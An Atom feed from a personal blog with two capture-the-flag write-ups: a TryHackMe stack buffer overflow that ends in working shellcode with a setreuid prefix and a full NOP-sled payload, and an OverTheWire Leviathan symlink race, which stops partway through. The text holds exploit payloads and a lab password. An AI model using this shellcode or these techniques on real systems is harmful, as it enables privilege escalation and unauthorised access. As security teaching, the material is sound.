<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<feed xmlns="http://www.w3.org/2005/Atom" xml:lang="en-us">
  <title>l1ge&#39;s cabin</title>
  <subtitle></subtitle>
  <id>https://l1ge.github.io/</id>
  <author>
    <name>l1ge&#39;s cabin</name>
    <uri>https://l1ge.github.io/</uri>
  </author>
  <icon>https://l1ge.github.io/image/brand/icon-1-1.png</icon>
  <logo>https://l1ge.github.io/image/brand/icon-2-1.png</logo>
  <updated>2022-04-23T13:54:08Z</updated>
  <link rel="self" type="application/atom+xml" href="https://l1ge.github.io/feed.atom" hreflang="en-us"/>
  <link rel="alternate" type="text/html" href="https://l1ge.github.io/" hreflang="en-us"/>
  <entry>
    <title>TryHackMe/Buffer_Overflows_(Bof1) _Task_8 _Write-up</title><author>
      <name>l1ge</name>
      <uri>https://l1ge.github.io</uri>
    </author>
    <id>https://l1ge.github.io/tryhackme_bof1/</id>
    <updated>2020-05-19T13:00:00Z</updated>
    <published>2020-05-19T13:00:00Z</published>
    <content type="html"><h1>0x0 About the room</h1>
<blockquote>
<p>Access: <a href="https://tryhackme.com/room/bof1">https://tryhackme.com/room/bof1</a></p>
</blockquote>
<p>Many people have been complaining about the difficulty of this room (rated as easy...) and the opacity of the instructions. I did too. It's supposed to be for beginners but the author assume you know how to use a disassembler and the shell code he gives you doesn't work so you eventually have to code your own.</p>
<p>Anyway, when I realized all that, I had already spent too much time to give up. It took me a few days to get the flags but I learned a lot.</p>
<p>Special thanks to rennox and tkiela who kept me on the surface when I was getting overflowed.</p>
<p><em>Disclaimer: I am a beginner,  this was my first buffer overflow and the first time I had to use gdb...Contact me if anything I say is incorrect.</em></p>
<h1>0x1 Finding the offset</h1>
<p>As explained in the instruction, the first step is to find the amount of bytes you need to fill in order to overwrite the return address.</p>
<h2>Method 1: The manual way</h2>
<p>Because we have access to she source code, we know the allocated memory for the buffer is at least 140 bytes. But between the 140th byte and the return address there is a gap filled with some &quot;<a href="http://www.songho.ca/misc/alignment/dataalign.html">alignment bytes</a>&quot; and by the rbp register (aka saved register) , which is 8 bytes in x64 architecture.</p>
<p>The offset will look like this : buffer(140 bytes) + Alignment bytes (?) + rbp (8 bytes).</p>
<p>So we know the offset will be at least 148 bytes long. To get the exact offset, we will fill the buffer with the letter 'A'  (\x41 in hex) until we start to see our 'As' overwriting the return address. I'll use gdb which I found easier to use than r2 for beginners.</p>
<p>Open gdb on your binary <code>$ gdb buffer-overflow</code></p>
<p>Let's start with 148  'A'.</p>
<pre><code class="language-bash">(gdb) run $(python -c &quot;print('A'*148)&quot;)

Starting program: $(python -c &quot;print('A'*148)&quot;)
Missing separate debuginfos, use: debuginfo-install glibc-2.26-32.amzn2.0.1.x86_64
Here's a program that echo's out your input
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

Program received signal SIGSEGV, Segmentation fault.
0x0000000000400595 in main ()
</code></pre>
<p>The last line contain the return address <code>0x0000000000400595</code>. As we can see, there are no '41' so we didn't override it. Let's increase to 155</p>
<pre><code class="language-bash">(gdb) run $(python -c &quot;print('A'*155)&quot;)
Here's a program that echo's out your input
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

Program received signal SIGSEGV, Segmentation fault.
0x0000000000414141 in ?? ()
</code></pre>
<p>We start to see that we're overwriting the return address.  I kept increasing and went too far after 159.</p>
<p>158 is  the right amount, which override perfectly the return address with 6 bytes.</p>
<pre><code class="language-bash">(gdb) run $(python -c &quot;print('\x41'*158)&quot;)
Here's a program that echo's out your input
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

Program received signal SIGSEGV, Segmentation fault.
0x0000414141414141 in ?? ()
</code></pre>
<p>So we know that with 158 bytes we override the 6-bytes-long return address. It means our offset to reach the start of the return address is 158-6 = <strong>152</strong></p>
<h2>Method 2 : With Metasploit's tool</h2>
<p>We create a pattern of a random length with the tool <code>pattern_create.rb</code> from  Metasploit's framework. Let's try a 200 bytes pattern.</p>
<pre><code class="language-bash">┌─[✗]─[l1ge@parrot]─[~]
└──╼$/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 200
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
</code></pre>
<p>We copy that pattern and run the binary in gdb with it</p>
<pre><code class="language-bash">(gdb) run 'Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag'

Here's a program that echo's out your input
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag

Program received signal SIGSEGV, Segmentation fault.
0x0000000000400563 in copy_arg ()
</code></pre>
<p>Despite the overflow, the return address doesn't show our pattern. We have to search it somewhere else, in the rbp register instead (remember? the rbp comes just before the return address)</p>
<p>We do that with the command <code>i r</code> to show all the registers</p>
<pre><code class="language-bash">(gdb) i r
rax            0xc9	201
rbx            0x0	0
rcx            0x7ffff7b08894	140737348929684
rdx            0x7ffff7dd48c0	140737351862464
rsi            0x602260	6300256
rdi            0x0	0
rbp            0x6641396541386541	0x6641396541386541  &lt;-------HERE IS THE PATTERN
rsp            0x7fffffffe2b8	0x7fffffffe2b8
r8             0x7ffff7fef4c0	140737354069184
r9             0x77	119
r10            0x5e	94
r11            0x246	582
r12            0x400450	4195408
r13            0x7fffffffe3b0	140737488348080
r14            0x0	0
r15            0x0	0
rip            0x400563	0x400563 &lt;copy_arg+60&gt;
eflags         0x10206	[ PF IF RF ]
cs             0x33	51
ss             0x2b	43
ds             0x0	0
es             0x0	0
fs             0x0	0
</code></pre>
<p>We see that the rbp has been overridden with the pattern. We then use metasploit's  <code>pattern-offset.rb</code> to query the pattern we found in the rbp</p>
<pre><code class="language-bash">┌─[✗]─[l1ge@parrot]─[~]
└──╼$/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 200 -q 6641396541386541
[*] Exact match at offset 144
</code></pre>
<p>It says that our rbp starts with an offset of 144. We know the rbp is 8 bytes so 144+8 = <strong>152</strong>. The offset we manually found is confirmed.</p>
<h1>0x2 Picking a shell code</h1>
<p>We need a shell code that we will put in our buffer and have the return address points to it. For now I just want a simple shell code, just to drop a shell.</p>
<p>There are a few on exploit-db like <a href="https://www.exploit-db.com/exploits/41750">this one</a> or <a href="https://www.exploit-db.com/exploits/42179">that one</a>. But I wont make you waste your time like I wasted mine. I've tried most of these simple shell codes and most of them didn't work on our case.  I was getting SIGILL errors all the time.</p>
<p>I later found out why: These short shell codes don't have an exit function call at their end, it means that once I injected these shell codes in the buffer and mess up the memory, the binary was still trying to execute these messed up instructions and thus, was reporting &quot;illegal instruction error&quot;.</p>
<p><em>Side note : I was able to get a shell with these simple shell codes but only by using another method : an env variable. With this method you don't put your shell code in the buffer but in an environment variable and then you give the return address the address of that variable. That way you don't mess up the memory and I didn't get any error.</em></p>
<p>So bellow is a similar simple shell code that i found but it includes an exit call at the end that will prevent the SIGILL errors.</p>
<p>The assembly version:</p>
<pre><code class="language-assembly">    push $0x3b
    pop %eax
    xor %rdx,%rdx
    movabs $0x68732f6e69622f2f,%r8  
    shr $0x8, %r8                   
    push %r8
    mov %rsp, %rdi
    push %rdx
    push %rdi
    mov %rsp, %rsi
    syscall				 &lt;------ from the top to this point it's too execute /bin/sh
    push $0x3c
    pop %eax
    xor %rdi,%rdi
    syscall 			&lt;------ The last 4 lines are for the exit function.
</code></pre>
<p>The hex version:</p>
<pre><code class="language-shell">\x6a\x3b\x58\x48\x31\xd2\x49\xb8\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x49\xc1\xe8\x08\x41\x50\x48\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05\x6a\x3c\x58\x48\x31\xff\x0f\x05
</code></pre>
<p>This shell code is 40 bytes . I'll cover more about shell codes in the last part of this write up.</p>
<h1>0x3 Finding the address of the shell code</h1>
<p>Our payload will be 158 bytes in total : 152 to fill the buffer and 6 to override the return address pointing to the address of the shell code in the buffer.</p>
<p>PAYLOAD = JUNK(100 bytes) + SHELL CODE (40 bytes) + JUNK (12 byes) + RETURN ADDRESS (6 bytes).</p>
<p>There are no specific reason why I put 100 bytes before and 12 bytes after the shell code. You can try different things as long as the total without the return address is 152.</p>
<p>Let's fill the junk with 'A's for now, and our return address with 6*'B'</p>
<pre><code class="language-shell">(gdb) run $(python -c &quot;print 'A'*100+'\x6a\x3b\x58\x48\x31\xd2\x49\xb8\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x49\xc1\xe8\x08\x41\x50\x48\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05\x6a\x3c\x58\x48\x31\xff\x0f\x05' + 'A'*12 + 'B'*6&quot;)
</code></pre>
<p>We will now examine the dump of the hex code with the command <code>x/100x $rsp-200</code> which dumps 100*4 bytes from memory location $rsp -200 bytes.</p>
<pre><code class="language-bash">(gdb) x/100x $rsp-200
0x7fffffffe228:	0x00400450	0x00000000	0xffffe3e0	0x00007fff
0x7fffffffe238:	0x00400561	0x00000000	0xf7dce8c0	0x00007fff
0x7fffffffe248:	0xffffe64d	0x00007fff	0x41414141	0x41414141 &lt;--- start of the buffer
0x7fffffffe258:	0x41414141	0x41414141	0x41414141	0x41414141
0x7fffffffe268:	0x41414141	0x41414141	0x41414141	0x41414141
0x7fffffffe278:	0x41414141	0x41414141	0x41414141	0x41414141
0x7fffffffe288:	0x41414141	0x41414141	0x41414141	0x41414141
0x7fffffffe298:	0x41414141	0x41414141	0x41414141	0x41414141
0x7fffffffe2a8:	0x41414141	0x41414141	0x41414141	0x48583b6a &lt;--- start of the shellcode
0x7fffffffe2b8:	0xb849d231	0x69622f2f	0x68732f6e	0x08e8c149
0x7fffffffe2c8:	0x89485041	0x485752e7	0x050fe689	0x48583c6a
0x7fffffffe2d8:	0x050fff31	0x41414141	0x41414141	0x41414141
0x7fffffffe2e8:	0x42424242	0x00004242	0xffffe3e8	0x00007fff
</code></pre>
<p>We see all the 41 that we filled the buffer with. And then we see our shell code.</p>
<p>To calculate the exact address where the shell code starts,  you first  take the memory address on the left on the same line : 0x7fffffffe2a8. This is the address of the first column on this line (filed with 41 at the moment). And then you add 4 bytes per column. Our shell code is 3 columns further so you need to add 3*4= 12 bytes to that address.</p>
<p>In hex 12 is 0xC, you need to do 0x7fffffffe2a + 0xC = 0x7fffffffe2b4</p>
<p>We now got the exact address where the shell code start in the buffer, so we could override the return address with it and it should work.  But sometimes memory shift a bit, from one execution to another the address might change. That's why we use NOPs</p>
<h2>NOPs</h2>
<p>Instead of filling the junk before the shell code with 'A'  we fill it with NOPs (\x90).</p>
<p>The NOPs are instructions to do nothing, they will be skipped. It means that now, you don't need to get the exact address where your shell code start but any address in the NOPS, the program will skip all the NOPS and execute your shell code. That way if the memory shift a bit, your exploit will still work.</p>
<p>Let's replace the 'A's with NOPs and dump our hex again.</p>
<pre><code class="language-bash">(gdb) run $(python -c &quot;print '\x90'*100+'\x6a\x3b\x58\x48\x31\xd2\x49\xb8\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x49\xc1\xe8\x08\x41\x50\x48\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05\x6a\x3c\x58\x48\x31\xff\x0f\x05' + 'A'*12 + 'B'*6&quot;)

Here's a program that echo's out your input
����������������������������������������������������������������������������������������������������j;XH1�I�//bin/shI�APH��RWH��j&lt;XH1�AAAAAAAAAAAABBBBBB

Program received signal SIGSEGV, Segmentation fault.
0x0000424242424242 in ?? ()

(gdb) x/100x $rsp-200
0x7fffffffe228:	0x00400450	0x00000000	0xffffe3e0	0x00007fff
0x7fffffffe238:	0x00400561	0x00000000	0xf7dce8c0	0x00007fff
0x7fffffffe248:	0xffffe64d	0x00007fff	0x90909090	0x90909090 &lt;----- Nops start here
0x7fffffffe258:	0x90909090	0x90909090	0x90909090	0x90909090
0x7fffffffe268:	0x90909090	0x90909090	0x90909090	0x90909090
0x7fffffffe278:	0x90909090	0x90909090	0x90909090	0x90909090
0x7fffffffe288:	0x90909090	0x90909090	0x90909090	0x90909090
0x7fffffffe298:	0x90909090	0x90909090	0x90909090	0x90909090 &lt;----- The address I pick
0x7fffffffe2a8:	0x90909090	0x90909090	0x90909090	0x48583b6a &lt;----- shellcode
0x7fffffffe2b8:	0xb849d231	0x69622f2f	0x68732f6e	0x08e8c149
0x7fffffffe2c8:	0x89485041	0x485752e7	0x050fe689	0x48583c6a
0x7fffffffe2d8:	0x050fff31	0x41414141	0x41414141	0x41414141
0x7fffffffe2e8:	0x42424242	0x00004242	0xffffe3e8	0x00007fff
0x7fffffffe2f8:	0x00000000	0x00000002	0x004005a0	0x00000000
0x7fffffffe308:	0xf7a4302a	0x00007fff	0x00000000	0x00000000
0x7fffffffe318:	0xffffe3e8	0x00007fff	0x00040000	0x00000002
</code></pre>
<p>You can now just pick any  address as long as its in the NOPS, I'll pick 0x7fffffffe298.</p>
<p>We need to convert it to little endian:</p>
<p>0x7fffffffe298 becomes 0x98e2ffffff7f and eventually \x98\xe2\xff\xff\xff\x7f</p>
<p>Now let's try to get a shell! We replace the last 6 bytes that were just 6*'B', by this address.</p>
<p>Let's run it outside gdb to be sure we're in the good environment.</p>
<pre><code class="language-bash">$ ./buffer-overflow $(python -c &quot;print '\x90'*100+'\x6a\x3b\x58\x48\x31\xd2\x49\xb8\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x49\xc1\xe8\x08\x41\x50\x48\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05\x6a\x3c\x58\x48\x31\xff\x0f\x05' + 'A'*12 + '\x98\xe2\xff\xff\xff\x7f'&quot;)

Here's a program that echo's out your input
����������������������������������������������������������������������������������������������������j;XH1�I�//bin/shI�APH��RWH��j&lt;XH1�AAAAAAAAAAAA�����
sh-4.2$
</code></pre>
<p>Yeay ! We're in !</p>
<pre><code class="language-bash">sh-4.2$ whoami
user1
sh-4.2$ cat secret.txt
cat: secret.txt: Permission denied
</code></pre>
<p>Aww...As we can see, we're only user1. And we can't access the secret file. Let's look at the permissions.</p>
<pre><code class="language-bash">$ ls -l
total 20
-rwsrwxr-x 1 user2 user2 8264 Sep  2  2019 buffer-overflow
-rw-rw-r-- 1 user1 user1  285 Sep  2  2019 buffer-overflow.c
-rw------- 1 user2 user2   22 Sep  2  2019 secret.txt
</code></pre>
<p>Secret.txt can only be read by user 2, ok we knew that. But the buffer-overflow binary has the the setuid bit (the 's' in the permissions), so I expected that dropping a shell would  give me user2's privileges!  It's not the case and I'll explain why.</p>
<h1>0x4 About Setuid, Setreuid</h1>
<p>There are two main reasons why we're not user2:</p>
<p>First, for security reasons,  the setuid bit is given only when it's necessary. As I understood it, you would have to add in the shell code a function that says &quot;now its necessary to give setuid(UID) to run the next command&quot;.  So I first tried to do just that.</p>
<p>I looked for user's 2 UID</p>
<pre><code class="language-bash">$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
.
.
user1:x:1001:1001::/home/user1:/bin/bash
user2:x:1002:1002::/home/user2:/bin/bash  
user3:x:1003:1003::/home/user3:/bin/bash
</code></pre>
<p>We can see the UID of user2 is 1002. And I looked for a way to add the function <code>setuid(1002)</code> at the top of my shell code and thus become user2 in the shell.</p>
<p>But... that didn't work. Which takes me to the second reason:</p>
<p>When you drop the shell, /bin/sh looks at your <strong>real</strong> UID and not your <strong>effective</strong> UID. You can do research about the difference between real and effective UID but mostly, the funtion setuid(), except if its called on root, only sets your effective UID.  So even if we call setuid(1002), our real UID would still be 1001 and thus we'll remain user1 in the shell.  We need to use another function: <a href="http://man7.org/linux/man-pages/man2/setreuid.2.html">setreuid()</a></p>
<p><em>Side note: Most of the time in these exploits, we want to become root and we target binaries who have the setuid-root bit. In that case, simply doing setuid(0) would work because when called on root, setuid(0) also sets you real UID to root.</em></p>
<p>setreuid() can set both your real and effective uid.  So we need to modify our shell code to execute setreuid(1002,1002) before it executes /bin/sh. And that mean, coding in assembly : Yeeay!</p>
<h1>0x5 Modifying the shell code</h1>
<p>Depending on your knowledge in assembly and in C, there are different ways to approach it:</p>
<ul>
<li>You can write your shellcode in C, compile it, look at the assembly code, remove the bad characters and use it in your exploit.</li>
<li>You can go straight to assembly, find an existing shell code that uses setreuid() and modify it.</li>
<li>The easiest option : you can use <a href="http://docs.pwntools.com/en/stable/">pwntools</a></li>
</ul>
<h2>Manually</h2>
<p>I personally did the 2nd option before i realized pwntools would have been easier. If you're in a hurry go straight to that part bellow.</p>
<p>I grabbed <a href="http://shell-storm.org/shellcode/files/shellcode-77.php">this shell code</a> that setuid(0) , drops a shell and exits. I went to an IRC assembly channel and asked for help to modify it.</p>
<p>First my goal was to setuid(1002), someone helped me to do that. But as I said above, it wasn't enough to become user2. Then I was able to modify it to call setreuid() instead of setuid().  I had to look for the function's %rax number in this <a href="https://blog.rchapman.org/posts/Linux_System_Call_Table_for_x86_64/">Linux System Call Table</a></p>
<p>setreuid()'s rax number is 113 ( 0x71 in hex).  And it takes its two arguments from the rdi and rsi registers.</p>
<p>Here was my assembly code in the end:</p>
<pre><code class="language-assembly">xor    rdi,rdi			&lt;------ set the rdi to 0
xor    rax,rax		
xor    rsi, rsi    		&lt;------ set the rsi to 0
mov    si, 1002  	    &lt;------ put the value 1002 in the lower bits of the rsi
mov    di, 1002			&lt;------ put the value 1002 in the lower bits of the rdi
mov    al,0x71			&lt;------ put the setruid function in the al register      
syscall					&lt;------ call the function.
xor    rdx,rdx
movabs rbx,0x68732f6e69622fff
shr    rbx,0x8
push   rbx
mov    rdi,rsp
xor    rax,rax
push   rax
push   rdi
mov    rsi,rsp
mov    al,0x3b
syscall
push   0x1
pop    rdi
push   0x3c
pop    rax
syscall
</code></pre>
<p>And I converted it to hex using <a href="https://defuse.ca/online-x86-assembler.htm">Online Assembly</a> .</p>
<pre><code class="language-shell">\x48\x31\xFF\x48\x31\xC0\x48\x31\xF6\x66\xBE\xEA\x03\x66\xBF\xEA\x03\xB0\x71\x0F\x05\x48\x31\xD2\x48\xBB\xFF\x2F\x62\x69\x6E\x2F\x73\x68\x48\xC1\xEB\x08\x53\x48\x89\xE7\x48\x31\xC0\x50\x57\x48\x89\xE6\xB0\x3B\x0F\x05\x6A\x01\x5F\x6A\x3C\x58\x0F\x05
</code></pre>
<p>But if you don't want to bother with trying to understand assembly, there is a much easier way.</p>
<h2>With Pwntools</h2>
<p>You can use <a href="http://docs.pwntools.com/en/stable/">pwntools</a> and its shellcraft module to generate shellcodes for you. We already have a working shell code to get a shell, so we just need to add to it the setreuid() part.</p>
<p>Install pwntools following the instruction on their site. Then run:</p>
<pre><code class="language-bash">┌─[✗]─[l1ge@parrot]─[~]
└──╼$pwn shellcraft -f d amd64.linux.setreuid 1002
</code></pre>
<p><code>-f d</code> sets the format to &quot;escaped&quot;.  You can set <code>-f a</code> to look at the assembly version</p>
<p><em>Side note: It would also work if you don't specify the UID 1002 .  It would automatically grab the effective UID with geteuid() and set it as your Real UID. But I keep it that way to make things clearer.</em></p>
<p>You get you the following shellcode</p>
<pre><code class="language-shell">\x31\xff\x66\xbf\xea\x03\x6a\x71\x58\x48\x89\xfe\x0f\x05
</code></pre>
<p>We just have to paste it in front of our working shell code from section 0x2. The result it:</p>
<pre><code class="language-shell">\x31\xff\x66\xbf\xea\x03\x6a\x71\x58\x48\x89\xfe\x0f\x05\x6a\x3b\x58\x48\x31\xd2\x49\xb8\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x49\xc1\xe8\x08\x41\x50\x48\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05\x6a\x3c\x58\x48\x31\xff\x0f\x05
</code></pre>
<p>It is now longer,  54 bytes in total, so we have to reduce the number of NOPs to keep the offset at 152.</p>
<p>Our final payload looks like this  :</p>
<pre><code class="language-bash">$(python -c &quot;print '\x90'*86+'\x31\xff\x66\xbf\xea\x03\x6a\x71\x58\x48\x89\xfe\x0f\x05\x6a\x3b\x58\x48\x31\xd2\x49\xb8\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x49\xc1\xe8\x08\x41\x50\x48\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05\x6a\x3c\x58\x48\x31\xff\x0f\x05' + 'A'*12 + '\x98\xe2\xff\xff\xff\x7f'&quot;)
</code></pre>
<p>Run it</p>
<pre><code class="language-bash">$ ./buffer-overflow $(python -c &quot;print '\x90'*86+'\x31\xff\x66\xbf\xea\x03\x6a\x71\x58\x48\x89\xfe\x0f\x05\x6a\x3b\x58\x48\x31\xd2\x49\xb8\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x49\xc1\xe8\x08\x41\x50\x48\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05\x6a\x3c\x58\x48\x31\xff\x0f\x05' + 'A'*12 + '\x98\xe2\xff\xff\xff\x7f'&quot;)

Here's a program that echo's out your input
��������������������������������������������������������������������������������������1�f��jqXH��j;XH1�I�//bin/shI�APH��RWH��j&lt;XH1�AAAAAAAAAAAA�����

sh-4.2$ whoami
user2
</code></pre>
<p>You're user2, <code>cat secret.txt</code> and enjoy.</p>
<p>Task 9 works exactly the same way with a different offset.</p>
<p>Good luck ! -l1ge.</p></content>
  </entry>
  <entry>
    <title>OverTheWire/Leviathan_2 _Write-up</title><author>
      <name>l1ge</name>
      <uri>https://l1ge.github.io</uri>
    </author>
    <id>https://l1ge.github.io/leviathan2/</id>
    <updated>2020-05-05T18:00:00Z</updated>
    <published>2020-05-05T18:00:00Z</published>
    <content type="html"><p>There are plenty of write-ups out there for Leviathan's Level 2.  But none of them solved it the way I did: <strong>the fun way!</strong> - When you miss the very obvious solution but your qwerky way finally work</p>
<p>Let's first access the level</p>
<blockquote>
<p>ssh -p 2223 leviathan2@leviathan.labs.overthewire.org</p>
<p>password: ougahZi8Ta</p>
</blockquote>
<h1>Recon</h1>
<p>In the home folder there is an executable named <code>printfile</code>. Let's check its permissions</p>
<pre><code class="language-bash">$ ls -l
total 8
-r-sr-x--- 1 leviathan3 leviathan2 7436 Aug 26  2019 printfile
</code></pre>
<p>It has the SUID bit (s), which means we can run it with the permissions of its owner leviathan3
Great! so let's try to print leviathan3 password</p>
<pre><code class="language-bash">$ ./printfile /etc/leviathan_pass/leviathan3
You cant have that file...
</code></pre>
<p>That would have been too easy. For some reason <code>printfile</code> doesn't allow us to access a file owned by leviathan3 despite the SUID bit. Let's investigate the binary with the command <code>ltrace</code></p>
<pre><code class="language-bash">$ ltrace ./printfile /etc/leviathan_pass/leviathan3
__libc_start_main(0x804852b, 2, 0xffffd764, 0x8048610 &lt;unfinished ...&gt;
access(&quot;/etc/leviathan_pass/leviathan3&quot;, 4)                         = -1
puts(&quot;You cant have that file...&quot;You cant have that file...
)                                  = 27
+++ exited (status 1) +++
</code></pre>
<p>I also tried <code>strace</code> to check the system calls</p>
<pre><code class="language-bash">$ strace ./printfile /etc/leviathan_pass/leviathan3
execve(&quot;./printfile&quot;, [&quot;./printfile&quot;, &quot;/etc/leviathan_pass/leviathan3&quot;], [/* 17 vars */]) = 0
strace: [ Process PID=32706 runs in 32 bit mode. ]
brk(NULL)                               = 0x804b000
fcntl64(0, F_GETFD)                     = 0
fcntl64(1, F_GETFD)                     = 0
fcntl64(2, F_GETFD)                     = 0
access(&quot;/etc/suid-debug&quot;, F_OK)         = -1 ENOENT (No such file or directory)
access(&quot;/etc/ld.so.nohwcap&quot;, F_OK)      = -1 ENOENT (No such file or directory)
mmap2(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xf7fd2000
access(&quot;/etc/ld.so.preload&quot;, R_OK)      = -1 ENOENT (No such file or directory)
open(&quot;/etc/ld.so.cache&quot;, O_RDONLY|O_CLOEXEC) = 3
fstat64(3, {st_mode=S_IFREG|0644, st_size=36357, ...}) = 0
mmap2(NULL, 36357, PROT_READ, MAP_PRIVATE, 3, 0) = 0xf7fc9000
close(3)                                = 0
access(&quot;/etc/ld.so.nohwcap&quot;, F_OK)      = -1 ENOENT (No such file or directory)
open(&quot;/lib32/libc.so.6&quot;, O_RDONLY|O_CLOEXEC) = 3
read(3, &quot;\177ELF\1\1\1\3\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0\0\204\1\0004\0\0\0&quot;..., 512) = 512
fstat64(3, {st_mode=S_IFREG|0755, st_size=1787812, ...}) = 0
mmap2(NULL, 1796604, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 3, 0) = 0xf7e12000
mmap2(0xf7fc3000, 12288, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x1b0000) = 0xf7fc3000
mmap2(0xf7fc6000, 10748, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0xf7fc6000
close(3)                                = 0
mmap2(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xf7e10000
set_thread_area({entry_number:-1, base_addr:0xf7e10700, limit:1048575, seg_32bit:1, contents:0, read_exec_only:0, limit_in_pages:1, seg_not_present:0, useable:1}) = 0 (entry_number:12)
mprotect(0xf7fc3000, 8192, PROT_READ)   = 0
mprotect(0x8049000, 4096, PROT_READ)    = 0
mprotect(0xf7ffc000, 4096, PROT_READ)   = 0
munmap(0xf7fc9000, 36357)               = 0
access(&quot;/etc/leviathan_pass/leviathan3&quot;, R_OK) = -1 EACCES (Permission denied)
fstat64(1, {st_mode=S_IFCHR|0620, st_rdev=makedev(136, 7), ...}) = 0
brk(NULL)                               = 0x804b000
brk(0x806c000)                          = 0x806c000
write(1, &quot;You cant have that file...\n&quot;, 27You cant have that file...
) = 27
exit_group(1)                           = ?
+++ exited with 1 +++
</code></pre>
<p>To be honest, I don't understand what most of this means, but one line is pretty straightforward :</p>
<pre><code class="language-bash">access(&quot;/etc/leviathan_pass/leviathan3&quot;, R_OK) = -1 EACCES (Permission denied)
</code></pre>
<p>There is an <em>access()</em> function that checks if I can access the file. Let's investigate how that function works.</p>
<h1>Researches</h1>
<p>From this <a href="https://linux.die.net/man/2/access">link</a> I get a few interesting informations:</p>
<blockquote>
<p>The check is done using the calling process's real UID and GID, rather than the effective IDs as is done when actually attempting an operation (e.g., open(2)) on the file. This allows set-user-ID programs to easily determine the invoking user's authority.</p>
</blockquote>
<p>OK now I understand why, despite the SUID bit on the <code>printfile</code>, I can't access the password file.
I keep reading and stumble upon a serious lead :</p>
<blockquote>
<p><strong>Warning</strong>: Using access() to check if a user is authorized to, for example, open a file before actually doing so using open(2) creates a security hole, because the user might exploit the short time interval between checking and opening the file to manipulate it. For this reason, the use of this system call should be avoided.</p>
</blockquote>
<p>I like that!
I decide to Google more and I discovered that this kind of vulnerabilities was called <strong>TOCTOU</strong> (Time-of-check to time-of-use) and was mostly abused using symlinks.</p>
<p>The idea is to modify the file between the moment it gets checked for permissions and the moment it gets opened. This is done by creating a symlink on the file, targeting the real file we wanna access. But this happens so fast, how can I do that ?</p>
<p>That's when it becomes fun. I could have made a script but in the intro of the Leviathan's series, its said you don't need to write scripts to solve any of the level.</p>
<p>Instead I did it... manually.</p>
<h1>Exploit</h1>
<p>I used <code>tmux</code> to be able to launch two commands simultaneously. You can also use <code>screen</code></p>
<pre><code class="language-bash">$watch -n 0.1 &quot;touch /tmp/l1ge/lev3; ln -sf /etc/leviathan_pass/leviathan3 /tmp/l1ge/lev3; rm /tmp/l1ge/lev3&quot;
</code></pre>
<p>This command runs every 0.1 seconds with<code>watch -n 0.1</code></p>
<ul>
<li><code>touch /tmp/l1ge/lev3</code> - creates a file <em>lev3</em></li>
<li><code>ln -sf /etc/leviathan_pass/leviathan3 /tmp/l1ge/lev3</code>  - Creates a symlink on <em>lev3</em> targetting leviathan3's password file</li>
